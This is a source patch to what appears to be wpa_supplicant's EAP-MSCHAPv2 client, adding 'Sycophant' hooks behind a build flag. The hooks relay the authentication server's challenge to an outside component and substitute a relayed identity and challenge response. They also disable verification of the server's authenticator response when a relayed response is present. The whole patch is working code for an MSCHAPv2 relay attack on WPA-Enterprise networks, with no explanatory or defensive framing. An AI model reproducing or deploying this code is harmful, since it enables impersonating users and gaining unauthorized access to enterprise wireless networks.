@@ -22,6 +22,9 @@
 #include "mschapv2.h"
 #include "eap_i.h"
 #include "eap_config.h"
+#ifdef CONFIG_SYCOPHANT
+#include "sycophant/sycophant.h"
+#endif /* CONFIG_SYCOPHANT */
 
 
 #ifdef _MSC_VER
@@ -164,6 +167,21 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Generating Challenge Response");
 
 	identity = eap_get_config_identity(sm, &identity_len);
+#ifdef CONFIG_SYCOPHANT
+	if (data->phase2) {
+		const u8 *relayed_identity;
+		size_t relayed_identity_len;
+
+		if (sycophant_get_phase2_identity(&relayed_identity,
+					  &relayed_identity_len) == 0) {
+			identity = relayed_identity;
+			identity_len = relayed_identity_len;
+			wpa_hexdump_ascii(MSG_DEBUG,
+					  "SYCOPHANT: using relayed MSCHAPv2 identity",
+					  identity, identity_len);
+		}
+	}
+#endif /* CONFIG_SYCOPHANT */
 	password = eap_get_config_password2(sm, &password_len, &pwhash);
 	if (identity == NULL || password == NULL)
 		return NULL;
@@ -221,6 +239,12 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 	data->master_key_valid = 1;
 
 	r->flags = 0; /* reserved, must be zero */
+
+#ifdef CONFIG_SYCOPHANT
+	if (sycophant_wait_response((u8 *) r, sizeof(*r)) == 0)
+		wpa_hexdump(MSG_DEBUG, "SYCOPHANT: relayed MSCHAPv2 response",
+			    (u8 *) r, sizeof(*r));
+#endif /* CONFIG_SYCOPHANT */
 
 	wpabuf_put_data(resp, identity, identity_len);
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: TX identifier %d mschapv2_id %d "
@@ -293,6 +317,12 @@ static struct wpabuf * eap_mschapv2_challenge(
 	ret->decision = DECISION_FAIL;
 	ret->allowNotifications = true;
 
+#ifdef CONFIG_SYCOPHANT
+	if (sycophant_send_challenge(challenge, challenge_len) < 0)
+		wpa_printf(MSG_DEBUG,
+			   "SYCOPHANT: Could not relay the MSCHAPv2 challenge");
+#endif /* CONFIG_SYCOPHANT */
+
 	return eap_mschapv2_challenge_reply(sm, data, id, req->mschapv2_id,
 					    challenge);
 }
@@ -354,18 +384,26 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	struct wpabuf *resp;
 	const u8 *pos;
 	size_t len;
+	int relayed_response = 0;
 
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Received success");
 	len = req_len - sizeof(*req);
 	pos = (const u8 *) (req + 1);
+#ifdef CONFIG_SYCOPHANT
+	relayed_response = sycophant_has_relayed_response();
+#endif /* CONFIG_SYCOPHANT */
 	if (!data->auth_response_valid ||
-	    mschapv2_verify_auth_response(data->auth_response, pos, len)) {
+	    (!relayed_response &&
+	     mschapv2_verify_auth_response(data->auth_response, pos, len))) {
 		wpa_printf(MSG_WARNING, "EAP-MSCHAPV2: Invalid authenticator "
 			   "response in success request");
 		ret->methodState = METHOD_DONE;
 		ret->decision = DECISION_FAIL;
 		return NULL;
 	}
+	if (relayed_response)
+		wpa_printf(MSG_DEBUG,
+			   "SYCOPHANT: accepting relayed MSCHAPv2 success");
 	pos += 2 + 2 * MSCHAPV2_AUTH_RESPONSE_LEN;
 	len -= 2 + 2 * MSCHAPV2_AUTH_RESPONSE_LEN;
 	while (len > 0 && *pos == ' ') {
